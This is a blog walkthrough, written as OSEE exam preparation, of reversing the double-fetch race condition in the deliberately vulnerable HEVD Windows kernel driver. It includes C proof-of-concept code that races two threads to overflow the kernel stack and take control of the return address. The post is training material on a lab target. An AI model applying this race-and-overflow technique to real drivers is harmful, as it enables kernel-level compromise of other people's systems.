[Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/kernel/race-2)

## HEVD Double-fetch Walkthrough on Windows 2022

# Introduction

At the time of writing I am studying towards attempting the [OffSec OSEE exam](https://www.offsec.com/courses/exp-401/), and will probably take it more than once! I realised I know very little about **_race conditions_** and so decided to take on the **Double-fetch** vulnerability in the [Hacksys Extreme Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver).

A double fetch is a type of race condition vulnerability. It occurs when a program, typically in the kernel, fetches data from user space more than once without ensuring the integrity of the data between the fetches. This provides an opportunity for an attacker to alter the data between the two fetches, exploiting the time window between the two operations. This gap between the two fetches creates a window of opportunity for exploitation, making it a form of **time-of-check-to-time-of-use (TOCTOU)** vulnerability.

I have briefly written about [kernel debugging](https://plackyhacker.github.io/kernel/hevd) before, so will not do so here.

# Gathering Information

Let's start by finding the **Symlink** and **dispatch routines**; We will use the symlink to communicate with the driver from user mode and **IOCTLs** will direct our buffer to the correct dispatch routine and from there we can look for the bug.

Using **WinDbg**, whilst debugging the remote kernel we find the `IRP_MJ_DEVICE_CONTROL` dispatch function:

```
1: kd> .reload
Connected to Windows 10 20348 x64 target at (Sun Sep 29 17:57:35.528 2024 (UTC + 1:00)), ptr64 TRUE
Loading Kernel Symbols
...
1: kd> lm
Browse full module list
start             end                 module name
...
fffff800`15f30000 fffff800`15fbc000   HEVD       (deferred)             
1: kd> !drvobj \Driver\HEVD 2
Driver object (ffff828630c6be30) is for:
Unable to load image \??\C:\Users\Administrator\Desktop\HEVD\HEVD.sys, Win32 error 0n2
 \Driver\hevd

...
[0e] IRP_MJ_DEVICE_CONTROL              fffff80015fb5078	HEVD+0x85078
...
```

To find the the symlink we can use **IDA** and start by looking in the `DriverEntry` function (I renamed the call to `HEVDDriverSetup`):

```
000000000008A134 public DriverEntry
000000000008A134 DriverEntry proc near
000000000008A134
000000000008A134 arg_0= qword ptr  8
000000000008A134
000000000008A134 mov     [rsp+arg_0], rbx
000000000008A139 push    rdi
000000000008A13A sub     rsp, 20h
000000000008A13E mov     rbx, rdx
000000000008A141 mov     rdi, rcx
000000000008A144 call    __security_init_cookie
000000000008A149 mov     rdx, rbx
000000000008A14C mov     rcx, rdi
000000000008A14F call    HEVDDriverSetup
000000000008A154 mov     rbx, [rsp+28h+arg_0]
000000000008A159 add     rsp, 20h
000000000008A15D pop     rdi
000000000008A15E retn
000000000008A15E DriverEntry endp
```

Following this `call` takes us to the next code block:

```
000000000008A000 mov     [rsp-8+arg_0], rbx
000000000008A005 mov     [rsp-8+arg_8], rdi
000000000008A00A push    rbp
000000000008A00B mov     rbp, rsp
000000000008A00E sub     rsp, 60h
000000000008A012 and     [rbp+arg_10], 0
000000000008A017 lea     rdx, aDeviceHacksyse ; "\\Device\\HackSysExtremeVulnerableDriver"
...
```

This looks suspiciously like the symlink!

## IOCTL

Now I needed to find the I/O Control Code for the double-fetch bug. In reality this isn't going to be simple in a real-world scenario, but I'm here to learn how to exploit a double-fetch bug, not reverse engineer the driver binary.

I decompiled the assembly in IDA and found this:

```c
case 0x222037:
  DbgPrintEx(0x4Du, 3u, "****** HEVD_IOCTL_DOUBLE_FETCH ******\n");
  v6 = DoubleFetchFunction(a2, v2);
  v7 = "****** HEVD_IOCTL_DOUBLE_FETCH ******\n";
```

I renamed the function that `v6` points to, this was `sub_86800` (which conveniently means the sub routine at an offset of `0x86800` from the base address of the module).

Following a few calls that the HEVD code uses to set up each bug I land here:

```c
__int64 __fastcall sub_8681C(const void **a1)
{
  unsigned __int64 v2; // r9
  char v4[2048]; // [rsp+20h] [rbp-808h] BYREF

  sub_1500(v4, 0LL, 2048LL);
  ProbeForRead(a1, 16LL, 1LL);
  DbgPrintEx(0x4Du, 3u, "[+] UserDoubleFetch: 0x%p\n", a1);
  DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", v4);
  DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%X\n", 2048LL);
  DbgPrintEx(0x4Du, 3u, "[+] UserDoubleFetch->Buffer: 0x%p\n", *a1);
  DbgPrintEx(0x4Du, 3u, "[+] UserDoubleFetch->Size: 0x%X\n", a1[1]);
  v2 = (unsigned __int64)a1[1];
  if ( v2 <= 0x800 )
  {
    DbgPrintEx(0x4Du, 3u, "[+] Triggering Double Fetch\n");
    RtlCopyMemory(v4, *a1, a1[1]);
    return 0LL;
  }
  else
  {
    DbgPrintEx(0x4Du, 3u, "[-] Invalid Buffer Size: 0x%X\n", v2);
    return 3221225485LL;
  }
}
```

## Reversing and Tidying Up

[Microsoft documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-probeforread) states that "the **ProbeForRead** routine checks that a user-mode buffer actually resides in the user portion of the address space, and is correctly aligned". At this point I'm not getting overly concerned with this!

I reversed the immediate function before the call to `sub_8681C` using the [Vergilius Project](https://www.vergiliusproject.com/kernels/x64/windows-10/22h2/_IO_STACK_LOCATION) to understand the variables being sent to the vulnerable function:

```c
__int64 __fastcall DoubleFetchFunction(__int64 Irp, __int64 CurrentStackLocation)
{
  const void **Type3InputBuffer; // rcx
  __int64 result; // rax

  Type3InputBuffer = *(const void ***)(CurrentStackLocation + 0x20);
  result = 0xC0000001LL;
  if ( Type3InputBuffer )
    return sub_8681C(Type3InputBuffer);
  return result;
}
```

From this we can ascertain that a buffer that we control is being sent. Removing all of the debug statements, we are left with:

```c
__int64 __fastcall sub_8681C(const void **InputBuffer)
{
  const void *SizeOfBuffer; // r9

  // creating a kernel buffer on the stack (not sure why the type is __m128i)  
  __m128i KernelBuffer[128]; // [rsp+20h] [rbp-808h] BYREF  <-- eagle eyes will notice that a buffer of size 0x808 will overwrite the return address

  // not 100% but this looks like a call to memset (zeroing out 0x800 bytes)?
  maybe_memset((__m128 *)KernelBuffer, 0, 0x800uLL);

  // this checks that our input buffer is mapped to user mode
  ProbeForRead(InputBuffer, 16LL, 1LL);

  // the size we provide is taken and checked to ensure it is <= 0x800
  SizeOfBuffer = InputBuffer[1];
  if ( (unsigned __int64)SizeOfBuffer <= 0x800 )
  {
    // here is the bug, instead of using SizeOfBuffer to make the copy
    // InputBuffer[1] is being fetched again (this is the double fetch)
    RtlCopyMemory(KernelBuffer, (unsigned __int64)*InputBuffer, (unsigned __int64)InputBuffer[1]);
    return 0LL;
  }
  else
  {
    return 0xC000000DLL;;
  }
}
```

It looks like we can try to win a race between the `if` statement and the `RtlMoveMemory` statement. The plan is to create a user space buffer of say `0xc00` bytes, send the a pointer to this `InputBuffer[0]` and a size fo `0x800` in `InputBuffer[1]`, then somehow change the buffer size in the struct to `0xc00`. We will set up a basic PoC with what we know first.

## Proof of Concept

Let's start with a proof of concept with which to test connectivity:

```c
#include <stdio.h>
#include <Windows.h>

struct UserData {
    LPVOID pBuffer;
    size_t sizeOfData;
};

int main() {
    printf("HEVD Double Fetch Exploit\n=========================\n");

    // get a handle to the driver
    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // allocate the user space buffer
    userBuffer = (char*)malloc(sizeof(char*) * 0xc00);
    memset((void*)userBuffer, 0x41, 0xc00);

    // struct to send to the driver
    UserData userData;
    userData.pBuffer = userBuffer;
    userData.sizeOfData = 0x800;

    // send our data
    BOOL status = DeviceIoControl(hDriver, 0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    // output the status
    printf("[+] status, when buffer size is 0x800: %d\n", status);

    // send our data, with larger buffer size
    userData.sizeOfData = 0x1500;
    status = DeviceIoControl(hDriver, 0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    // output the status
    printf("[+] status, when buffer size is 0x1500:%d\n", status);
}
```

Here we test the driver by creating a user space buffer of `0x1500` bytes. First we send the struct that points to our data with a `sizeOfData` field value of `0x800` and then we send the same struct but this time with a `sizeOfData` field value of `0x1500`:

```
HEVD Double Fetch Exploit
=========================
[+] status, when buffer size is 0x800: 1
[+] status, when buffer size is 0x1500:0
```

Looking at the assembly for the function, we see that `rcx` is moved in to `rdi` at offset `0x86838`, `rcx` should hold our struct at the start of the function.

```
000000000008681C mov     rax, rsp
000000000008681F mov     [rax+8], rbx
0000000000086823 mov     [rax+10h], rsi
0000000000086827 mov     [rax+18h], rdi
000000000008682B mov     [rax+20h], r14
000000000008682F push    r15
0000000000086831 sub     rsp, 820h
0000000000086838 mov     rdi, rcx
```

Let's put a breakpoint at offset `HEVD+0x8681c` and run the code again:

```
1: kd> g
Breakpoint 0 hit
HEVD+0x8681c:
fffff801`296d681c 488bc4          mov     rax,rsp
1: kd> dq poi(rcx)
0000012e`673aeff0  41414141`41414141 41414141`41414141
0000012e`673af000  41414141`41414141 41414141`41414141
0000012e`673af010  41414141`41414141 41414141`41414141
0000012e`673af020  41414141`41414141 41414141`41414141
0000012e`673af030  41414141`41414141 41414141`41414141
0000012e`673af040  41414141`41414141 41414141`41414141
0000012e`673af050  41414141`41414141 41414141`41414141
0000012e`673af060  41414141`41414141 41414141`41414141
```

This output shows that the struct passed in to the kernel points at our buffer. We can also show the value of the `sizeOfData` field:

```
1: kd> dd rcx+8 L1
00007ff7`4d094628  00000800
```

Perfect! Now we know that the PoC is working we can move on to the tricky next phase, which is triggering the bug by winning a race!

## Winning the Race

I decided to create two threads, one for sending the normal IOCTL that should pass the buffer length check, and a second thread to try and change the buffer size before the copy operation; this is the race condition I am trying to win. To do this I set the structure changing thread to run a loop 100 times:

```c
// this is the function trying to win the race
DWORD WINAPI ChangeStruct(void* args)
{
    for (int i = 1; i < 100; i++)
    {
        userData.sizeOfData = 0xc00;
    }
    return NULL;
}

// this is the function sending the IOCTL
DWORD WINAPI SendIOCTL(void* args)
{
    userData.pBuffer = userBuffer;
    userData.sizeOfData = 0x800;
    BOOL status = DeviceIoControl(hDriver,
        0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    return NULL;
}
```

My logic was that if there was a single thread changing the structure 100 times, then hopefully the IOCTL calling thread would drop in between two of these and I would win the race. To make things nice and simple I used global variables, rather than passing pointers between threads (which I will probably tidy up for the final exploit):

```c
// global variables
UserData userData;
char* userBuffer;
HANDLE hDriver;
```

I done a little bit of research around race conditions and I read some different texts around changing the threads priority and setting the processor affinity for each thread. I did this, but was curious to see if the race could be one without doing this, and it turns out it can. Here's the main snippets of my code:

```c
int main() {
    // omitted for brevity ...
    while(TRUE)
    {
        HANDLE handles[2] = { 0 };

        // send the initial IOCTL
        HANDLE tIOCTL = CreateThread(NULL,
            NULL, SendIOCTL, NULL, CREATE_SUSPENDED, NULL);

        // try to win the race
        HANDLE tChangeStruct = CreateThread(NULL,
            NULL, ChangeStruct, NULL, CREATE_SUSPENDED, NULL);

        handles[0] = tIOCTL;
        handles[1] = tChangeStruct;

        ResumeThread(tChangeStruct);
        ResumeThread(tIOCTL);

        // wait for threads
        WaitForMultipleObjects(2, handles, true, INFINITE);
    }
}
```

Notice that my loop will run forever, this isn't going to be a good strategy when it comes to escalating privileges, I will need some way to detect that the race had been won, I decided to think about that later. My focus for now was to win the race and overwrite the return address on the kernel stack.

I ran the code on the target whilst my kernel debugger was attached, and after a few minutes I got a crash:

```
1: kd> g
Access violation - code c0000005 (!!! second chance !!!)
HEVD+0x86952:
fffff800`15fb6952 c3              ret
0: kd> k L5
 # Child-SP          RetAddr               Call Site
00 fffff68f`df25a788 41414141`41414141     HEVD+0x86952
01 fffff68f`df25a790 41414141`41414141     0x41414141`41414141
02 fffff68f`df25a798 41414141`41414141     0x41414141`41414141
03 fffff68f`df25a7a0 41414141`41414141     0x41414141`41414141
04 fffff68f`df25a7a8 41414141`41414141     0x41414141`41414141
```

Boom! I had triggered the bug and forced a buffer overflow on the stack. My next goal was to control `rip` with a ROP gadget.

## Controlling RIP

I ran the PoC again but this time copied an `msf-pattern_create` buffer into the user mode buffer:

```c
char pattern[] = "Aa0Aa1Aa2Aa3Aa4Aa5 // ... 0xc00 bytes
memcpy_s(userBuffer, 0xc00, pattern, 0xc00);
```

I walked the dog, waiting for the race condition to trigger the bug... race conditions can take time...

When the bug triggered I got a rather unhelpful bugcheck in Windows:

```
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

UNEXPECTED_KERNEL_MODE_TRAP (7f)
```

So I examined the call stack anyway:

```
1: kd> k
 # Child-SP          RetAddr               Call Site
00 ffffcd00`e325e508 fffff800`10f549d2     nt!DbgBreakPointWithStatus
...
23 fffff68f`ded9c788 37714336`71433571     0xfffff800`15fb6952
24 fffff68f`ded9c790 72433971`43387143     0x37714336`71433571
25 fffff68f`ded9c798 43327243`31724330     0x72433971`43387143
26 fffff68f`ded9c7a0 35724334`72433372     0x43327243`31724330
```

Way down the stack I found something that looked like my pattern, so I checked out the value at position `23`:

```
msf-pattern_offset -l 0xc00 -q 3771433671433571  
[*] Exact match at offset 2056
```

I changed the PoC to see if I could overwrite the return address on the stack with `0x4242424242424242`, if this was successful then I had found the offset of the return address overflow:

```c
userBuffer = (char*)malloc(sizeof(char*) * 0xc00);
memset((void*)userBuffer, 0x41, 0xc00);
memset((void*)(userBuffer + 2056), 0x42, 0x8);
```

Another cup of coffee... race conditions can take time...

```
1: kd> g
Access violation - code c0000005 (!!! second chance !!!)
fffff800`15fb6952 c3              ret
1: kd> k L5
 # Child-SP          RetAddr               Call Site
00 fffff68f`ded8e788 42424242`42424242     0xfffff800`15fb6952
01 fffff68f`ded8e790 41414141`41414141     0x42424242`42424242
02 fffff68f`ded8e798 41414141`41414141     0x41414141`41414141
03 fffff68f`ded8e7a0 41414141`41414141     0x41414141`41414141
04 fffff68f`ded8e7a8 41414141`41414141     0x41414141`41414141
```

There we have it, control of the return address at a buffer offset of `0x808`, directly after the intended buffer size. In [Part 2](https://plackyhacker.github.io/kernel/race-2) I will attempt to get privilege escalation and restore the thread gracefully.

[Home](https://plackyhacker.github.io) : [Part 2](https://plackyhacker.github.io/kernel/race-2)
